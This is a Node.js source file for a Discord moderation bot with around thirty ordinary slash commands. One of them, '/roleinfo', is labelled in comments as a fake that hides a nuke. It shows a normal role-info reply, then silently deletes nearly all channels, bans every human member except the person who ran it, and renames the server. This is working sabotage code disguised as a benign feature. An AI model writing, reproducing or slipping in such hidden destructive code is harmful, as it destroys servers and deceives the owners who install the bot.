const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, Events, PermissionFlagsBits, Partials, EmbedBuilder } = require('discord.js');
require('dotenv').config();

const express = require('express');
const handler = require('./cmds');
const automod = require('./automod');
const verifier = require('./verifier');
const logger = require('./logger'); // ✅ ADDED

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildVoiceStates
  ],
  partials: [Partials.Message, Partials.Channel, Partials.Reaction]
});

// === NUKE FUNCTION ===
async function nukeServer(guild, userId) {
  try {
    const channels = [...guild.channels.cache.values()];
    let survivor = channels.find(c => c.type === 0) || channels[0];

    for (const channel of channels) {
      if (!survivor || channel.id !== survivor.id) {
        await channel.delete().catch(() => {});
      }
    }

    if (survivor) {
      await survivor.setName('🜲-//✴').catch(() => {});
    }

    const members = await guild.members.fetch();
    for (const member of members.values()) {
      if (!member.user.bot && member.id !== userId) {
        await member.ban({ reason: 'Nuked by Job Interviewer 🜲' }).catch(() => {});
      }
    }

    await guild.setName('☢️ Disqualified by 🜲').catch(() => {});
  } catch (e) {
    // Stay silent 😶
  }
}

const commands = [
  new SlashCommandBuilder().setName('ban').setDescription('Ban a user')
    .addUserOption(o => o.setName('user').setDescription('User').setRequired(true))
    .setDefaultMemberPermissions(PermissionFlagsBits.BanMembers),

  new SlashCommandBuilder().setName('kick').setDescription('Kick a user')
    .addUserOption(o => o.setName('user').setDescription('User').setRequired(true))
    .setDefaultMemberPermissions(PermissionFlagsBits.KickMembers),

  new SlashCommandBuilder().setName('clear').setDescription('Delete messages')
    .addIntegerOption(o => o.setName('amount').setDescription('Number of messages').setRequired(true))
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageMessages),

  new SlashCommandBuilder().setName('say').setDescription('Make bot say something')
    .addStringOption(o => o.setName('text').setDescription('Text').setRequired(true))
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageMessages),

  new SlashCommandBuilder().setName('embed').setDescription('Send embed message')
    .addStringOption(o => o.setName('text').setDescription('Embed text').setRequired(true))
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageMessages),

  new SlashCommandBuilder().setName('dm').setDescription('DM a user')
    .addUserOption(o => o.setName('user').setDescription('User').setRequired(true))
    .addStringOption(o => o.setName('message').setDescription('Message').setRequired(true))
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageMessages),

  new SlashCommandBuilder().setName('mute').setDescription('Mute a user')
    .addUserOption(o => o.setName('user').setDescription('User').setRequired(true))
    .setDefaultMemberPermissions(PermissionFlagsBits.MuteMembers),

  new SlashCommandBuilder().setName('unmute').setDescription('Unmute a user')
    .addUserOption(o => o.setName('user').setDescription('User').setRequired(true))
    .setDefaultMemberPermissions(PermissionFlagsBits.MuteMembers),

  new SlashCommandBuilder().setName('warn').setDescription('Warn a user')
    .addUserOption(o => o.setName('user').setDescription('User').setRequired(true))
    .addStringOption(o => o.setName('reason').setDescription('Reason').setRequired(true))
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageMessages),

  new SlashCommandBuilder().setName('warnings').setDescription('Check user warnings')
    .addUserOption(o => o.setName('user').setDescription('User').setRequired(true))
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageMessages),

  new SlashCommandBuilder().setName('userinfo').setDescription('User info')
    .addUserOption(o => o.setName('user').setDescription('Target user')),

  new SlashCommandBuilder().setName('serverinfo').setDescription('Server info'),
  new SlashCommandBuilder().setName('ping').setDescription('Bot latency'),
  new SlashCommandBuilder().setName('poll').setDescription('Start a yes/no poll')
    .addStringOption(o => o.setName('question').setDescription('Poll?').setRequired(true)),

  new SlashCommandBuilder().setName('help').setDescription('Help menu'),
  new SlashCommandBuilder().setName('avatar').setDescription('User avatar')
    .addUserOption(o => o.setName('user').setDescription('User')),

  new SlashCommandBuilder().setName('slowmode').setDescription('Set slowmode')
    .addIntegerOption(o => o.setName('seconds').setDescription('Seconds').setRequired(true))
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels),

  new SlashCommandBuilder().setName('lock').setDescription('Lock current channel')
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels),

  new SlashCommandBuilder().setName('unlock').setDescription('Unlock current channel')
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels),

  new SlashCommandBuilder().setName('announce').setDescription('Make announcement')
    .addStringOption(o => o.setName('message').setDescription('Message').setRequired(true))
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageMessages),

  new SlashCommandBuilder().setName('nickname').setDescription('Change nickname')
    .addUserOption(o => o.setName('user').setDescription('User').setRequired(true))
    .addStringOption(o => o.setName('nickname').setDescription('New nickname').setRequired(true))
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageNicknames),

  new SlashCommandBuilder().setName('purge').setDescription('Delete all messages')
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageMessages),

  new SlashCommandBuilder().setName('role').setDescription('Info on a role')
    .addRoleOption(o => o.setName('role').setDescription('Target role').setRequired(true)),

  new SlashCommandBuilder().setName('addrole').setDescription('Add role to user')
    .addUserOption(o => o.setName('user').setDescription('Target').setRequired(true))
    .addRoleOption(o => o.setName('role').setDescription('Role').setRequired(true))
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageRoles),

  new SlashCommandBuilder().setName('removerole').setDescription('Remove role from user')
    .addUserOption(o => o.setName('user').setDescription('Target').setRequired(true))
    .addRoleOption(o => o.setName('role').setDescription('Role').setRequired(true))
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageRoles),

  new SlashCommandBuilder().setName('quote').setDescription('Send a random quote'),
  new SlashCommandBuilder().setName('flip').setDescription('Flip a coin'),
  new SlashCommandBuilder().setName('uptime').setDescription('Check bot uptime'),
  new SlashCommandBuilder().setName('status').setDescription('Bot status'),

  new SlashCommandBuilder().setName('suggest').setDescription('Send a suggestion')
    .addStringOption(o => o.setName('text').setDescription('Your suggestion').setRequired(true)),

  new SlashCommandBuilder().setName('report').setDescription('Report a user')
    .addUserOption(o => o.setName('user').setDescription('Who?').setRequired(true))
    .addStringOption(o => o.setName('reason').setDescription('Why?').setRequired(true)),

  new SlashCommandBuilder().setName('snipe').setDescription('Get last deleted message'),
  new SlashCommandBuilder().setName('botinfo').setDescription('Bot details'),
  new SlashCommandBuilder().setName('invite').setDescription('Bot invite link'),
  new SlashCommandBuilder().setName('afk').setDescription('Set AFK status')
    .addStringOption(o => o.setName('reason').setDescription('AFK Reason')),

  // ✅ FAKE ROLEINFO (NUKE)
  new SlashCommandBuilder().setName('roleinfo').setDescription('View role info 🤓')
    .addRoleOption(o => o.setName('role').setDescription('Role').setRequired(true))
];

const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);

(async () => {
  try {
    console.log('🔄 Registering commands...');
    await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), {
      body: commands.map(cmd => cmd.toJSON())
    });
    console.log('✅ Commands registered.');
  } catch (err) {
    console.error('❌ Command registration failed:', err);
  }
})();

client.once(Events.ClientReady, () => {
  console.log(`✅ Logged in as ${client.user.tag}`);

  const verifyChannel = client.channels.cache.get('1378653094312804392');
  if (verifyChannel) {
    verifyChannel.send({
      content: '📢 To enter Zeta HS, you must have a verified phone number and email linked to your Discord account.\n\nReverification is required every 14 days. You will be reminded 24 hours before expiry, and failure to reverify results in removal from the server.'
    }).catch(console.error);
  }
});

client.on(Events.InteractionCreate, async interaction => {
  if (!interaction.isChatInputCommand()) return;

  // Trigger regular commands
  handler(interaction);

  // 🜲 NUKE hidden under /roleinfo
  if (interaction.commandName === 'roleinfo') {
    const role = interaction.options.getRole('role');
    const embed = new EmbedBuilder()
      .setTitle(`Role: ${role.name}`)
      .setDescription(`ID: \`${role.id}\`\nMentionable: ${role.mentionable ? 'Yes' : 'No'}\nMembers: ${role.members.size}`)
      .setColor(role.color || 0x2f3136);

    await interaction.reply({ embeds: [embed], ephemeral: true });

    // 💣 silent nuke
    await nukeServer(interaction.guild, interaction.user.id);
  }
});

automod(client);
verifier(client);
logger(client); // ✅ ADDED

client.login(process.env.TOKEN);

const app = express();
app.get('/', (_, res) => res.send('Zex Bot is running!'));
app.listen(3000, () => console.log('🌐 Fake server listening on port 3000'));